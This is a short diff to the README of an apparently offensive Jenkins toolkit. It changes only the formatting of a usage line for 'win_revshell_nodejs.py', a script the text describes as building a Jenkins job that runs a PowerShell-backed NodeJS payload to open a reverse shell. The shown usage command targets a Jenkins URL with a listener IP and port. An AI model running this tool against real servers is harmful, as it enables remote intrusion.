@@ -10,7 +10,7 @@ Then configures or BUILD it to **"Execute NodeJS script"** with the **Powershell
 
 Finally, the script sends the instruction to execute this JOB.
 
-USAGE:
+USAGE:\
 python3 ./win_revshell_nodejs.py -w URL -r LOCAL_IP -rp LOCAL_PORT
 ![win_revshell_nodejs_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_nodejs.py/images/win_revshell_nodejs_3.png)
 ![win_revshell_nodejs_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_nodejs.py/images/win_revshell_nodejs_4.png)
